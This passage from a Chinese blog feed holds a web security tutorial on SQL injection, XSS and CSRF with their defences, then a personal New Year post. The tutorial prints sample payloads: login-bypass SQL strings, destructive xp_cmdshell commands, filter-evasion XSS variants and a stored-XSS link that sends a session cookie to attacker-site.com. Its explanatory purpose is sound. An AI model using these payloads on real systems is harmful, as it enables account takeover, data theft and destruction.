+&quot;&apos;);&quot;  </span><br></pre></td></tr></table></figure><p>恶意填入</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[java]</span><br><span class="line">   </span><br><span class="line">userName = &quot;&apos;1&apos; OR &apos;1&apos;=&apos;1&apos;&quot;;</span><br><span class="line"></span><br></pre></td></tr></table></figure>  <p>与<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[java] </span><br><span class="line">   </span><br><span class="line">passWord = &quot;&apos;1&apos; OR &apos;1&apos;=&apos;1&apos;&quot;;  </span><br><span class="line"></span><br></pre></td></tr></table></figure><br>时，将导致原本的SQL字符串被填为</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">[java] </span><br><span class="line">   </span><br><span class="line">strSQL = &quot;SELECT * FROM users WHERE (name = &apos;1&apos; OR &apos;1&apos;=&apos;1&apos;) and (pw = &apos;1&apos; OR &apos;1&apos;=&apos;1&apos;);&quot;  </span><br><span class="line"></span><br></pre></td></tr></table></figure><p>也就是实际上运行的SQL命令会变成下面这样的</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">[java] </span><br><span class="line">   </span><br><span class="line">strSQL = &quot;SELECT * FROM users;&quot;  </span><br></pre></td></tr></table></figure><p>因此达到无账号密码，亦可登录网站。所以SQL注入攻击被俗称为黑客的填空游戏。</p><h3 id="可能造成的伤害"><a href="#可能造成的伤害" class="headerlink" title="可能造成的伤害"></a>可能造成的伤害</h3><p>数据表中的数据外泄，例如个人机密数据，账户数据，密码等。<br>数据结构被黑客探知，得以做进一步攻击（例如<code>SELECT * FROM sys.tables</code>）。<br>数据库服务器被攻击，系统管理员账户被窜改（例如<code>ALTER LOGIN sa WITH PASSWORD=’xxxxxx’</code>）。<br>获取系统较高权限后，有可能得以在网页加入恶意链接以及XSS。<br>经由数据库服务器提供的操作系统支持，让黑客得以修改或控制操作系统（例如<code>xp_cmdshell “net stop iisadmin”</code>可停止服务器的IIS服务）。<br>破坏硬盘数据，瘫痪全系统（例如<code>xp_cmdshell “FORMAT C:”</code>）。</p><h3 id="防范"><a href="#防范" class="headerlink" title="防范"></a>防范</h3><p>1、在设计应用程序时，完全使用参数化查询（Parameterized Query）来设计数据访问功能。<br>2、在组合SQL字符串时，先针对所传入的参数作字元取代（将单引号字元取代为连续2个单引号字元）。<br>3、如果使用PHP开发网页程序的话，亦可打开PHP的魔术引号（Magic quote）功能（自动将所有的网页传入参数，将单引号字元取代为连续2个单引号字元）。<br>4、其他，使用其他更安全的方式连接SQL数据库。例如已修正过SQL注入问题的数据库连接组件，例如ASP.NET的SqlDataSource对象或是 LINQ to SQL。<br>5、使用SQL防注入系统。</p><h3 id="关于SQL注入"><a href="#关于SQL注入" class="headerlink" title="关于SQL注入"></a>关于SQL注入</h3><h4 id="什么是SQL注入："><a href="#什么是SQL注入：" class="headerlink" title="什么是SQL注入："></a>什么是SQL注入：</h4><p>由于jdbc程序在执行的过程中sql语句在拼装时使用了由页面传入参数，如果用户恶意传入一些sql中的特殊关键字，会导致sql语句意义发生变化，这种攻击方式就叫做sql注入，参考用户注册登录案例。<br>首先看一下以下代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">[java] </span><br><span class="line">String sql = &quot;select* from users where username=&apos;&quot; + userName  </span><br><span class="line">                + &quot;&apos; and password=&apos;&quot; + passWord+&quot;&apos;&quot;;  </span><br><span class="line">        Connection conn = null;  </span><br><span class="line">        Statement state = null;  </span><br><span class="line">        ResultSet result;  </span><br><span class="line">        conn = JdbcUtil.getConnection();  </span><br><span class="line">        System.out.println(sql);  </span><br><span class="line">        try &#123;  </span><br><span class="line">            state = conn.createStatement();  </span><br><span class="line">            result = state.executeQuery(sql);  </span><br></pre></td></tr></table></figure><p>这是一段根据传入用户名，密码查找用户表的代码。</p><p>在做用户登录的验证的时候，我们可能会根据用户所填写的用户名和密码在后台拼成一条SQL语句执行，去查用户表：</p><p><code>select* from users where username=&#39;张三&#39; and password=&#39;小张&#39;</code>，如果能查出结果则表示验证成功，允许登录，否则账号或密码错误不允许登录。那么在组成这条语句的过程中会存在一个叫做SQL注入的问题，就是用户在输入用户名或密码的时候填写某些内容使得后台所拼成的SQL语句语义有所变化。</p><p>举个例子，在没有防止SQL的情况下：假如我们知道一个用户叫做张三，但是不知道这个用户的密码是什么，我们依然可以在登录的时候在用户输入框写上：张三’# 然后密码框任意填：njksad。一点击登录，会发现居然能够登录上去。那是为什么呢？</p><p>这是因为#在SQL中的意思是注释，那么我们根据上面的情况来分析一下最终所拼成的SQL语句是怎样的，</p><p><code>select* from users where username=&#39;张三&#39;#&#39; and password=&#39;njksad&#39;</code></p><p>可以看到  <code>username=&#39;张三&#39;</code>之后是一个<code>#</code></p><p>那就意味着之后的内容都是注释，也就是可以忽略掉那么这条语句真正发挥作用的部分就是：<code>select* from users where username=&#39;张三&#39;</code></p><p>直接变成了一条查找张三 的语句，完全不用经过密码验证。</p><h3 id="防止SQL注入攻击"><a href="#防止SQL注入攻击" class="headerlink" title="防止SQL注入攻击"></a>防止SQL注入攻击</h3><p>那么怎么才能做到防止SQL注入攻击呢?</p><p>在上面那段代码中，Statement的对象是用来执行SQL语句的，Statement有一个子类叫做PreparedStatement，可以做到防止SQL注入攻击，接下来我们来看看PreparedStatement有什么特点以及怎么使用：</p><p>PreparedStatement是Statement的孩子，不同的是，PreparedStatement使用预编译机制，在创建PreparedStatement对象时就需要将sql语句传入，传入的过程中参数要用?替代，这个过程回导致传入的sql被进行预编译，然后再调用PreparedStatement的setXXX将参数设置上去，由于sql语句已经经过了预编译，再传入特殊值也不会起作用了。<br>而且PreparedStatement使用了预编译机制，sql语句在执行的过程中效率比Statement要高。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line">[java] </span><br><span class="line">String sql = &quot;select* from users where username=? and password=?&quot;;  </span><br><span class="line">        Connection conn = null;  </span><br><span class="line">        PreparedStatement state = null;  </span><br><span class="line">        ResultSet result;  </span><br><span class="line">        conn = JdbcUtil.getConnection();  </span><br><span class="line">        System.out.println(sql);  </span><br><span class="line">        try &#123;  </span><br><span class="line">            state = conn.prepareStatement(sql);  </span><br><span class="line">            state.setString(1, userName);  </span><br><span class="line">            state.setString(2, passWord);  </span><br><span class="line">            result = state.executeQuery();  </span><br><span class="line"></span><br></pre></td></tr></table></figure><p>java中preparedstatement为什么可以防止sql注入？</p><p>其实是预编译功能，用preparedstatement就会把sql的结构给数据库预编译。</p><p>SQL注入攻击是利用是指利用设计上的漏洞，在目标服务器上运行Sql语句以及进行其他方式的攻击 ，<br>动态生成Sql语句时没有对用户输入的数据进行验证是Sql注入攻击得逞的主要原因。<br>对于JDBC而言，SQL注入攻击只对Statement有效，对PreparedStatement是无效的，这是因为PreparedStatement不允许在不同的插入时间改变查询的逻辑结构。<br>如验证用户是否存在的SQL语句为 ：<br><code>select count(*) from usertable where name=&#39;用户名 &#39; and pswd=&#39;密码 &#39;</code><br>如果在用户名字段中输入 <code>&#39; or &#39;1&#39;=&#39;1&#39; or &#39;1&#39;=&#39;1</code><br>或是在密码字段中输入<code>1&#39; or &#39;1&#39;=&#39;1</code><br>将绕过验证，但这种手段只对只对Statement有效，对PreparedStatement无效。<br>PreparedStatement相对Statement有以下优点： </p><p>1.防注入攻击<br>2.多次运行速度快<br>3.防止数据库缓冲区溢出<br>4.代 码 的可读性可维护性好 </p><h2 id="XSS攻击"><a href="#XSS攻击" class="headerlink" title="XSS攻击"></a>XSS攻击</h2><p>xss表示Cross Site Scripting(跨站脚本攻击)，它与SQL注入攻击类似，SQL注入攻击中以SQL语句作为用户输入，从而达到查询/修改/删除数据的目的，而在xss攻击中，通过插入恶意脚本，实现对用户游览器的控制。</p><p>xss攻击可以分成两种类型：</p><p>非持久型攻击<br>持久型攻击</p><h3 id="非持久型xss攻击"><a href="#非持久型xss攻击" class="headerlink" title="非持久型xss攻击"></a>非持久型xss攻击</h3><p>顾名思义，非持久型xss攻击是一次性的，仅对当次的页面访问产生影响。非持久型xss攻击要求用户访问一个被攻击者篡改后的链接，用户访问该链接时，被植入的攻击脚本被用户游览器执行，从而达到攻击目的。</p><p>假设有以下index.PHP页面：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[php] </span><br><span class="line">   </span><br><span class="line">&lt;?php  </span><br><span class="line">$name = $_GET[&apos;name&apos;];  </span><br><span class="line">echo &quot;Welcome $name&lt;br&gt;&quot;;  </span><br><span class="line">echo &quot;&lt;a href=&quot;https://blog.rookiehacker.org/2019/01/03/renewmywebsec/&quot;&gt;Click to Download&lt;/a&gt;&quot;;  </span><br><span class="line">?&gt;  </span><br><span class="line"></span><br></pre></td></tr></table></figure><br>该页面显示两行信息：</p><p>从URI获取 ‘name’ 参数，并在页面显示<br>显示跳转到一条URL的链接<br>这时，当攻击者给出以下URL链接：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[php] </span><br><span class="line">   </span><br><span class="line">index.php?name=guest&lt;script&gt;alert(&apos;attacked&apos;)&lt;/script&gt;  </span><br><span class="line"></span><br></pre></td></tr></table></figure><br>当用户点击该链接时，将产生以下html代码，带’attacked’的告警提示框弹出：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[php] </span><br><span class="line">   </span><br><span class="line">Welcome guest  </span><br><span class="line">&lt;script&gt;alert(&apos;attacked&apos;)&lt;/script&gt;  </span><br><span class="line">&lt;br&gt;  </span><br><span class="line">&lt;a href=&apos;https://blog.rookiehacker.org/2019/01/03/renewmywebsec/&apos;&gt;Click to Download&lt;/a&gt;  </span><br></pre></td></tr></table></figure><p>除了插入alert代码，攻击者还可以通过以下URL实现修改链接的目的：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[php] </span><br><span class="line">   </span><br><span class="line">index.php?name=  </span><br><span class="line">&lt;script&gt;  </span><br><span class="line">window.onload = function() &#123;  </span><br><span class="line">var link=document.getElementsByTagName(&quot;a&quot;);link[0].href=&quot;http://attacker-site.com/&quot;;&#125;  </span><br><span class="line">&lt;/script&gt;  </span><br></pre></td></tr></table></figure></p><p>当用户点击以上攻击者提供的URL时，index.php页面被植入脚本，页面源码如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">[php] </span><br><span class="line">   </span><br><span class="line">Welcome   </span><br><span class="line">&lt;script&gt;  </span><br><span class="line">window.onload = function() &#123;  </span><br><span class="line">var link=document.getElementsByTagName(&quot;a&quot;);link[0].href=&quot;http://attacker-site.com/&quot;;&#125;  </span><br><span class="line">&lt;/script&gt;  </span><br><span class="line">&lt;br&gt;  </span><br><span class="line">&lt;a href=&apos;https://blog.rookiehacker.org/2019/01/03/renewmywebsec/&apos;&gt;Click to Download&lt;/a&gt;  </span><br></pre></td></tr></table></figure><br>用户再点击 “Click to Download” 时，将跳转至攻击者提供的链接。</p><p>对于用于攻击的URL，攻击者一般不会直接使用以上可读形式，而是将其转换成ASCII码，以下URL同样用于实现链接地址变更：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[php] </span><br><span class="line">   </span><br><span class="line">index.php?name=%3c%73%63%72%69%70%74%3e%77%69%6e%64%6f%77%2e%6f%6e%6c%6f%61%64%20%3d%20%66%75%6e%63%74%69%6f%6e%28%29%20%7b%76%61%72%20%6c%69%6e%6b%3d%64%6f%63%75%6d%65%6e%74%2e%67%65%74%45%6c%65%6d%65%6e%74%73%42%79%54%61%67%4e%61%6d%65%28%22%61%22%29%3b%6c%69%6e%6b%5b%30%5d%2e%68%72%65%66%3d%22%68%74%74%70%3a%2f%2f%61%74%74%61%63%6b%65%72%2d%73%69%74%65%2e%63%6f%6d%2f%22%3b%7d%3c%2f%73%63%72%69%70%74%3e  </span><br></pre></td></tr></table></figure><h3 id="持久型xss攻击"><a href="#持久型xss攻击" class="headerlink" title="持久型xss攻击"></a>持久型xss攻击</h3><p>持久型xss攻击会把攻击者的数据存储在服务器端，攻击行为将伴随着攻击数据一直存在。下面来看一个利用持久型xss攻击获取session id的实例。</p><h4 id="session背景知识"><a href="#session背景知识" class="headerlink" title="session背景知识"></a>session背景知识</h4><p>我们知道HTTP是一个无状态维持的协议，所有请求/应答都是独立的，其间不保存状态信息。但有些场景下我们需要维护状态信息，例如用户登录完web应用后，再一定时间内，用户再进行登录，应不需要再输入用户名/密码进行鉴权。这时我们用cookie和session解决状态维护问题，当用户首次登入时，服务器为该用户创建一个 session ID，同时向游览器传送一个 cookie，cookie保存会话连接中用到的数据，session ID作为会话标识，游览器后续的请求均基于该session ID。攻击者可以提供一个攻击链接，当用户点击该链接时，向攻击者自己的服务器发送一条保存有用户session ID的信息，这样就可以窃取到用户的session ID，得到用户的执行权限。</p><h4 id="举例-1"><a href="#举例-1" class="headerlink" title="举例"></a>举例</h4><p>首先，攻击者以一个普通用户登录进来，然后在输入框中提交以下数据：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[php] </span><br><span class="line">   </span><br><span class="line">&lt;a href=# onclick=\&quot;document.location=\&apos;http://attacker-site.com/xss.php?c=\&apos;+escape\;\&quot;&gt;bangerlee&lt;/a&gt;  </span><br></pre></td></tr></table></figure><p>攻击者提交了条带<code>&lt;a&gt;</code>标签的数据，该条数据将保存在数据库中，而当<code>admin</code>用户登入时，包含 <code>“bangerlee”</code> 的用户列表将显示，如果 <code>admin</code>用户点击<code>“bangerlee”</code> 时，在 <code>“attacker-site.com”</code>所在的服务器上，攻击者就可以窃取到 <code>admin</code>的session-id：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[php] </span><br><span class="line">   </span><br><span class="line">xss.php?c=PHPSESSID%3Dvmcsjsgear6gsogpu7o2imr9f3  </span><br><span class="line"></span><br></pre></td></tr></table></figure></p><p>有了该session-id，攻击者在会话有效期内即可获得 admin 用户的权限，并且由于攻击数据已添加入数据库，只要攻击数据未被删除，那么攻击还有可能生效，是持久性的。</p><p>当然，不是只有持久型xss攻击才能窃取session ID、用户的cookie信息，用非持久型xss也可以，只要引导用户点击某链接，将 document.cookie 信息传到指定服务器即可，以上仅作为说明持久型xss攻击的举例。</p><h4 id="防范-1"><a href="#防范-1" class="headerlink" title="防范"></a>防范</h4><p>基于特征的防御</p><p>XSS漏洞和著名的SQL注入漏洞一样，都是利用了Web页面的编写不完善，所以每一个漏洞所利用和针对的弱点都不尽相同。这就给XSS漏洞防御带来了困难：不可能以单一特征来概括所有XSS攻击。</p><p>传统XSS防御多采用特征匹配方式，在所有提交的信息中都进行匹配检查。对于这种类型的XSS攻击，采用的模式匹配方法一般会需要对“JavaScript”这个关键字进行检索，一旦发现提交信息中包含“javascript”，就认定为XSS攻击。这种检测方法的缺陷显而易见：骇客可以通过插入字符或完全编码的方式躲避检测：</p><p>在javascript中加入多个tab键，得到<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&lt; IMG SRC=&quot;jav ascript:alert(&apos;XSS&apos;);&quot; &gt;;</span><br><span class="line">在javascript中加入(空格)字符，得到 </span><br><span class="line">&lt; IMG SRC=&quot;javascri pt:alert(&apos;XSS&apos;);&quot; &gt;;</span><br><span class="line">在javascript中加入(回车)字符，得到</span><br><span class="line">&lt; IMG SRC=&quot;jav </span><br><span class="line">ascript:alert(&apos;XSS&apos;);&quot; &gt;; </span><br><span class="line">4. 在javascript中的每个字符间加入回车换行符，得到 </span><br><span class="line">&lt; IMG SRC=&quot;javascrip\r </span><br><span class="line">\nt:alert(&apos;XSS&apos;);&quot; &gt; </span><br><span class="line">5. 对”javascript:alert(‘XSS’)”采用完全编码，得到 </span><br><span class="line">&lt; IMGSRC=javascrip?74:alert(&apos;XSS&apos;) &gt;</span><br></pre></td></tr></table></figure></p><p>上述方法都可以很容易的躲避基于特征的检测。而除了会有大量的漏报外，基于特征的还存在大量的误报可能：在上面的例子中，对上述某网站这样一个地址，由于包含了关键字“javascript”，也将会触发报警。</p><p>基于代码修改的防御</p><p>和SQL注入防御一样，XSS攻击也是利用了Web页面的编写疏忽，所以还有一种方法就是从Web应用开发的角度来避免：</p><p>对所有用户提交内容进行可靠的输入验证，包括对URL、查询关键字、HTTP头、POST数据等，仅接受指定长度范围内、采用适当格式、采用所预期的字符的内容提交，对其他的一律过滤。<br>实现Session标记(session tokens)、CAPTCHA系统或者HTTP引用头检查，以防功能被第三方网站所执行。<br>确认接收的的内容被妥善的规范化，仅包含最小的、安全的Tag(没有javascript)，去掉任何对远程内容的引用(尤其是样式表和javascript)，使用HTTP only的cookie。<br>当然，如上操作将会降低Web业务系统的可用性，用户仅能输入少量的制定字符，人与系统间的交互被降到极致，仅适用于信息发布型站点。并且考虑到很少有Web编码人员受过正规的安全培训，很难做到完全避免页面中的XSS漏洞。</p><h2 id="CSRF攻击"><a href="#CSRF攻击" class="headerlink" title="CSRF攻击"></a>CSRF攻击</h2><p>CSRF（Cross-site request forgery跨站请求伪造，也被称为“one click attack”或者session riding，通常缩写为CSRF或者XSRF，是一种对网站的恶意利用。尽管听起来像跨站脚本（XSS），但它与XSS非常不同，并且攻击方式几乎相左。XSS利用站点内的信任用户，而CSRF则通过伪装来自受信任用户的请求来利用受信任的网站。与XSS攻击相比，CSRF攻击往往不大流行（因此对其进行防范的资源也相当稀少）和难以防范，所以被认为比XSS更具危险性。</p><h3 id="CSRF攻击原理"><a href="#CSRF攻击原理" class="headerlink" title="CSRF攻击原理"></a>CSRF攻击原理</h3><p>CSRF攻击原理比较简单，假设Web A为存在CSRF漏洞的网站，Web B为攻击者构建的恶意网站，User C为Web A网站的合法用户。</p><p>1、用户C打开浏览器，访问受信任网站A，输入用户名和密码请求登录网站A；<br>2、在用户信息通过验证后，网站A产生Cookie信息并返回给浏览器，此时用户登录网站A成功，可以正常发送请求到网站A；<br>3、用户未退出网站A之前，在同一浏览器中，打开一个TAB页访问网站B；<br>4、网站B接收到用户请求后，返回一些攻击性代码，并发出一个请求要求访问第三方站点A；<br>5、浏览器在接收到这些攻击性代码后，根据网站B的请求，在用户不知情的情况下携带Cookie信息，向网站A发出请求。网站A并不知道该请求其实是由B发起的，所以会根据用户C的Cookie信息以C的权限处理该请求，导致来自网站B的恶意代码被执行。</p><h3 id="举例-2"><a href="#举例-2" class="headerlink" title="举例"></a>举例</h3><p>银行网站A，它以GET请求来完成银行转账的操作，如：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://www.mybank.com/Transfer.php?toBankId=11&amp;money=1000</span><br><span class="line"></span><br></pre></td></tr></table></figure></p><p>危险网站B，它里面有一段HTML的代码如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=http://www.mybank.com/Transfer.php?toBankId=11&amp;money=1000&gt;</span><br></pre></td></tr></table></figure><p>首先，你登录了银行网站A，然后访问危险网站B，噢，这时你会发现你的银行账户少了1000块……</p><p>为什么会这样呢？原因是银行网站A违反了HTTP规范，使用GET请求更新资源。在访问危险网站B的之前，你已经登录了银行网站A，而B中的<img>以GET的方式请求第三方资源（这里的第三方就是指银行网站了，原本这是一个合法的请求，但这里被不法分子利用了），所以你的浏览器会带上你的银行网站A的Cookie发出Get请求，去获取资源<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.mybank.com/Transfer.php?toBankId=11&amp;money=1000，</span><br></pre></td></tr></table></figure><br>结果银行网站服务器收到请求后，认为这是一个更新资源操作（转账操作），所以就立刻进行转账操作……</p><h3 id="防范-2"><a href="#防范-2" class="headerlink" title="防范"></a>防范</h3><p>检查Referer字段</p><p>HTTP头中有一个Referer字段，这个字段用以标明请求来源于哪个地址。在处理敏感数据请求时，通常来说，Referer字段应和请求的地址位于同一域名下。以上文银行操作为例，Referer字段地址通常应该是转账按钮所在的网页地址，应该也位于<code>www.examplebank.com</code>之下。而如果是CSRF攻击传来的请求，Referer字段会是包含恶意网址的地址，不会位于<code>www.examplebank.com</code>之下，这时候服务器就能识别出恶意的访问。</p><p>这种办法简单易行，工作量低，仅需要在关键访问处增加一步校验。但这种办法也有其局限性，因其完全依赖浏览器发送正确的Referer字段。虽然http协议对此字段的内容有明确的规定，但并无法保证来访的浏览器的具体实现，亦无法保证浏览器没有安全漏洞影响到此字段。并且也存在攻击者攻击某些浏览器，篡改其Referer字段的可能。</p><p>添加校验token</p><p>由于CSRF的本质在于攻击者欺骗用户去访问自己设置的地址，所以如果要求在访问敏感数据请求时，要求用户浏览器提供不保存在cookie中，并且攻击者无法伪造的数据作为校验，那么攻击者就无法再执行CSRF攻击。这种数据通常是表单中的一个数据项。服务器将其生成并附加在表单中，其内容是一个伪乱数。当客户端通过表单提交请求时，这个伪乱数也一并提交上去以供校验。正常的访问时，客户端浏览器能够正确得到并传回这个伪乱数，而通过CSRF传来的欺骗性攻击中，攻击者无从事先得知这个伪乱数的值，服务器端就会因为校验token的值为空或者错误，拒绝这个可疑请求。</p><hr><blockquote><p><em>声明：</em><br>文章标题：<a href="http://blog.rookiehacker.org/2019/01/03/renewmywebsec/" title="【Web渗透】是时候重拾技能了">【Web渗透】是时候重拾技能了</a><br>文章作者：<a href="http://blog.rookiehacker.org/about/">RookieHacker</a><br>文章链接：<a href="http://blog.rookiehacker.org/2019/01/03/renewmywebsec/" title="【Web渗透】是时候重拾技能了">http://blog.rookiehacker.org/2019/01/03/renewmywebsec/</a><br>文章版权属本博主所有，有问题或者建议欢迎在下方评论。欢迎转载、引用，但请标明作者和原文地址，谢谢。</p></blockquote><hr><p><em>喜欢，就支持我一下吧~</em></p><hr><p><iframe src="http://blog.rookiehacker.org/donate-page/simple/" style="overflow-x:hidden;overflow-y:hidden; border:0xp none #fff; min-height:240px; width:100%;" frameborder="0" scrolling="no"></iframe></p><hr>]]></content>
    
    <summary type="html">
    
      2018一年来大部分时间都用来复习考研了，好多东西长时间不碰都生疏了。。。。。今天的电话面试尴尬不？     o(╥﹏╥)oε=(´ο｀*)))唉是时候拾起来了~
    
    </summary>
    
      <category term="Web渗透" scheme="http://blog.rookiehacker.org/categories/Web%E6%B8%97%E9%80%8F/"/>
    
    
      <category term="Web" scheme="http://blog.rookiehacker.org/tags/Web/"/>
    
      <category term="渗透" scheme="http://blog.rookiehacker.org/tags/%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>【你好，2019!】再见，2018！你好，2019！</title>
    <link href="http://blog.rookiehacker.org/2019/01/01/hello-2019/"/>
    <id>http://blog.rookiehacker.org/2019/01/01/hello-2019/</id>
    <published>2019-01-01T07:18:43.000Z</published>
    <updated>2019-01-01T08:18:52.144Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>不知不觉，新年的钟声已经敲响，是时候回顾回顾过去，展望展望未来了~</p><h1 id="不知不觉，走过了2018"><a href="#不知不觉，走过了2018" class="headerlink" title="不知不觉，走过了2018"></a>不知不觉，走过了2018</h1><p>这一年，可能是我过得最快的一年了，甚至比高三都快。为什么这么说呢？因为这一年其实经历的事情并不是太多，从18年考研结束，自我感觉不太稳，当然成绩不出所料，并不想就这么“向生活妥协”，所以我选择了二战。然后就是毕业论文，做了大概一个月？？然后就是和大学同学一一告别，毕业典礼，毕业聚会，离校，合影。。。6月中旬，离开母校，我去了同学的大学和他一起开始了二战的苦逼生活。。</p><p>每天6点20伴随着起床号起床，7点到达教室背书自习。中午11点半去食堂觅食，午饭过后回教室或者宿舍午休，2点在赶回教室，下午5点半去食堂觅食。然后回到教室一直学到10点半大爷撵人。。回到宿舍洗刷开黑看视频。。备考的生活确实没多少亮点，但是却感觉很充实，每天看着越来越少的倒计时，巴不得12月22日早些到来，好让我脱离苦海，重新证明自己哈哈哈哈O(∩_∩)O哈哈~</p><p>当这一天真正到来，却也并没有多少的激动人心，可能是内心麻木？还是我早已百毒不侵？哈哈哈总之，我又出现在了小宾馆，小中学，小考场，来经历这场“小考试”！</p><p>两天时间很快就过去了，考完过后一身轻松，也没有了去年这时候的沮丧，还没兑答案，问题不大。自我感觉还行吧~然后就踩着2018的小尾巴，回家闭关咯~</p><p>这么看，2018确实没经历什么，但是，2018也是承上启下的一年吧。</p><p>2018的关键词：【考研失败】【毕业】【二战】</p><h1 id="不知不觉，迎来了2019"><a href="#不知不觉，迎来了2019" class="headerlink" title="不知不觉，迎来了2019"></a>不知不觉，迎来了2019</h1><p>时间的脚步飞快，2019如期而至。新年新气象，先来说说新年的几个小愿望吧！<br>1、当然是研究生考试能顺顺利利，愿我清北梦啊！~<br>2、希望能好好利用“没学上”这大半年，找到心仪的实习工作，积累经验，提高本领~<br>3、赚点学费啦啦啦啦<br>4、减脂增肌进行时ing~<br>5、牵手女神？？哈哈哈哈我的另一半你可快点出现吧！！！不然我攒钱给谁花呢O(∩_∩)O哈哈~<br>。。。</p><p>2019，也是自己走向社会的第一年，面对挑战，抓住机遇！无论狂风暴雨，还是满路荆棘，我要勇往直前！加油ヾ(◍°∇°◍)ﾉﾞ</p><p>2019的关键词：【机遇】【挑战】【勇往直前】</p><hr><blockquote><p><em>声明：</em><br>文章标题：<a href="http://blog.rookiehacker.org/2019/01/01/hello-2019/" title="【你好，2019!】再见，2018！你好，2019！">【你好，2019!】再见，2018！你好，2019！</a><br>文章作者：<a href="http://blog.rookiehacker.org/about/">RookieHacker</a><br>文章链接：<a href="http://blog.rookiehacker.org/2019/01/01/hello-2019/" title="【你好，2019!】再见，2018！你好，2019！">http://blog.rookiehacker.org/2019/01/01/hello-2019/</a><br>文章版权属本博主所有，有问题或者建议欢迎在下方评论。欢迎转载、引用，但请标明作者和原文地址，谢谢。</p></blockquote><hr><p><em>喜欢，就支持我一下吧~</em></p><hr><p><iframe src="http://blog.rookiehacker.org/donate-page/simple/" style="overflow-x:hidden;overflow-y:hidden; border:0xp none #fff; min-height:240px; width:100%;" frameborder="0" scrolling="no"></iframe></p><hr>]]></content>
    
    <summary type="html">
    
      告别2018，迎接2019！新的一年，加油ヾ(◍°∇°◍)ﾉﾞ
    
    </summary>
    
      <category term="生活" scheme="http://blog.rookiehacker.org/categories/%E7%94%9F%E6%B4%BB/"/>
    
    
      <category term="生活" scheme="http://blog.rookiehacker.org/tags/%E7%94%9F%E6%B4%BB/"/>
    
  </entry>
  
  <entry>
    <title>【计算机组成与设计】加法器的优化</title>
    <link href="http://blog.rookiehacker.org/2018/07/30/ComputerOrganizationandDesign-adder/"/>
    <id>http://blog.rookiehacker.org/2018/07/30/ComputerOrganizationandDesign-adder/</id>
    <published>2018-07-30T15:11:03.000Z</published>
    <updated>2018-07-30T15:49:13.241Z</updated>
    
